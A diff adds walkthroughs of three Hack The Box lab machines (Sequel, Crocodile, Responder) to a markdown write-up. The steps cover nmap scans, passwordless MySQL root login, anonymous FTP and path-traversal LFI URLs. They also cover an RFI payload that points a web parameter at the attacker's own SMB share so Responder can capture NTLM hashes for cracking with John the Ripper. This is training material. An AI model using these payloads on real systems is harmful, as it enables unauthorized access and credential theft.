@@ -181,6 +181,181 @@ For password use: anything the password is bypassed.
 ![2](https://github.com/user-attachments/assets/1c043299-5461-4ca8-8a54-4bf8d85503e2)
 
 
+**Sequel**
+
+<ins>Summary:<ins>
+
+*  Explore directory enumeration techniques to locate hidden files or pages that may contain sensitive information. This module reinforces the importance of secure authentication methods and demonstrates the risks of exposed directories in web applications.
+
+<ins>Taks:<ins>
+
+During our scan, which port do we find serving MySQL?
+
+![1](https://github.com/user-attachments/assets/9243119a-f913-43cb-b410-03e85002f777)
+
+What community-developed MySQL version is the target running?
+
+* After finding mySQL running, to check the version use: `mysql --help`
+
+* This shows I can use the `-V` command with mysql to get the version
+
+![1](https://github.com/user-attachments/assets/ca4205f9-2bdf-41bb-9c3d-a87a9b6a5b66)
+
+When using the MySQL command line client, what switch do we need to use in order to specify a login username?
+
+* In the `mysql --help` you can aslo see the `-u` is used for login if not current user.
+
+![1](https://github.com/user-attachments/assets/4e53457d-6327-445e-99ee-628271685837)
+
+* Command: mysql -h [taget IP] -u root (This command (`-h`) is connecting us to that host, (`-u`) is the username used to try to connect with.
+
+![1](https://github.com/user-attachments/assets/7006bb21-55ac-45ab-96cf-25d0d02de466)
+
+MySQL Commands:
+
+* For MySQL commands they end with `;`
+* `SHOW databases;` : Prints out the databases we can access.
+* `USE [database name];` : Set to use the database named [database_name].
+* `SHOW tables;` :  Prints out the available tables inside the current database.
+* `SELECT * FROM [table_name];` : Prints out all the data from the table {table_name}.
+
+There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that's unique to this host?
+
+* First to show the databases: `SHOW databases;`
+
+![1](https://github.com/user-attachments/assets/f08de30d-d138-4ff3-a5fe-6d496d81e2b5)
+
+Submit root flag.
+
+* To show flag, use the `USE [htb];`
+
+![1](https://github.com/user-attachments/assets/c84f4695-8aa9-4797-a48d-d6249ab0fdb3)
+
+* Now useing the htb database to see the tables inside use: `SHOW tables;`
+
+* Check the config and user tables to find flag with: `SELECT * FROM [table_name];`
+
+![1](https://github.com/user-attachments/assets/7c304e2a-74af-49a3-bd63-273512d0c350)
+
+**Crocodile**
+
+<ins>Summary:<ins>
+
+<ins>Taks:<ins>
+
+What service version is found to be running on port 21?
+
+* use: `sudo nmap -sC -sV [Target IP]
+
+![1](https://github.com/user-attachments/assets/9daa1b8c-1d7f-4b6a-a060-e93838b710d9)
+
+What FTP code is returned to us for the "Anonymous FTP login allowed" message?
+
+![1](https://github.com/user-attachments/assets/255e544b-f289-4434-a484-774771bcbd5f)
+
+After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously?
+
+* First to connect to the FTP client use: `ftp [target IP]
+
+* Users could connect to the FTP server anonymously if the server is configured to allow it, meaning that we could use it even if we had no valid credentials. If we look back at our nmap scan result, the FTP server is indeed configured to allow anonymous login:
+
+* Once connected use "anonymous" as the password to connect.
+
+After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server?
+
+* Use the `dir` command to list directories.
+
+![1](https://github.com/user-attachments/assets/cd6a04bb-e2f6-45b6-bc94-5ce39224f708)
+
+* Use `get` command to download files.
+
+* Use `exit` to leave ftp server.
+
+* Use `ls` to see if files were downloaded succesfully.
+
+![1](https://github.com/user-attachments/assets/4da9c7b5-f4ed-4c2b-9aad-6a97b580f93d)
+
+What is one of the higher-privilege sounding usernames in 'allowed.userlist' that we download from the FTP server?
+
+* `cat allowed.userlist`
+
+![1](https://github.com/user-attachments/assets/f5945598-a87f-45bd-8658-cffba61eb66a)
+
+What version of Apache HTTP Server is running on the target host?
+
+* `sudo nmap -sV [Target IP]
+
+![1](https://github.com/user-attachments/assets/584155e4-1f9e-4521-9e97-011aef49d5e2)
+
+**Repsonder**
+
+<ins>Summary:<ins>
+
+<ins>Taks:<ins>
+
+When visiting the web service using the IP address, what is the domain that we are being redirected to?
+
+* `sudo nmap -p- --min-rate 1000 -sV [target IP]
+
+* Now I will need to maually resolve the Domain name to the target IP. To do this editting the `/etc/hosts` is needed.
+
+* To edit the file use: `sudo nano /etc/hosts`
+
+* Then add the target IP and the domain
+
+![1](https://github.com/user-attachments/assets/ce20f326-1cca-4119-a441-d1cc49ba197e)
+
+* Now the domain is reachable
+
+What is the name of the URL parameter which is used to load different language versions of the webpage?
+
+* To find the URL parameter look in the search bar, after changing the webistes language and at the end you will see "page=" This is the URL parameter.
+
+* While page is a common example of a URL parameter used to load different versions of a webpage, there are many other types of URL parameters that serve different functions.
+
+* These parameters help create dynamic, user-friendly websites that respond to user input.
+
+* Noticing the URL, we can see that the french.html page is being loaded by the page parameter, which may potentially be vulnerable to a Local File Inclusion (LFI) vulnerability if the page input is not sanitized. 
+
+*  Local File Inclusion occurs when an attacker is able to get a website to include a file that was not intended to be an option for this application.
+
+*  To view all the most common types of LFI use this repositroy: https://github.com/Brad14t/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
+
+*  To try and traverse the target IP ill use: http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
+
+![1](https://github.com/user-attachments/assets/509e6aa6-d208-4352-ba75-4f78a16d268e)
+
+Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
+
+* RFI is a vulnerability that occurs when a web application allows external files to be included in its codebase. This is usually due to improper input validation, allowing attackers to inject a remote file, such as a script, into the application.
+
+* //10.10.14.6/somefile
+
+What does NTLM stand for?
+
+* New Technology LAN Manager
+
+* NTLM is a suite of security protocols developed by Microsoft to authenticate users and computers in a network environment.
+
+Which flag do we use in the Responder utility to specify the network interface?
+
+* Responder is a versatile tool that listens for various network protocol requests and captures authentication hashes.
+
+* To find out how to use Responder try: responder -h
+
+![1](https://github.com/user-attachments/assets/a6719fd0-fbe6-4271-ab29-8214e4323968)
+
+Before running responder, find your newtork interface by using: `ip a | grep [Target IP]` or `ip a` or `ifconfig`
+
+![2](https://github.com/user-attachments/assets/89a84fcc-7830-4073-8dd5-98c65160db5f)
+
+Now that responder is running use, we need to capture the hash from the RFI exploit. Input into your url: http://unika.htb/index.php?page=//<your_ip_address>/Sharefilehtb
+
+* Change the url to your IP, then we can seeresponder got something when interacting with the URL.
+
+![1](https://github.com/user-attachments/assets/d92c7b9b-fc31-4f0d-a1b1-83fc6b53d9e5)
+
+* We will be using John the ripper as a password cracker. It is an open-source password cracking tool, commonly referred to as “John.” Its primary purpose is to crack password hashes using dictionary attacks, brute force, or various other methods. 
 
 
 
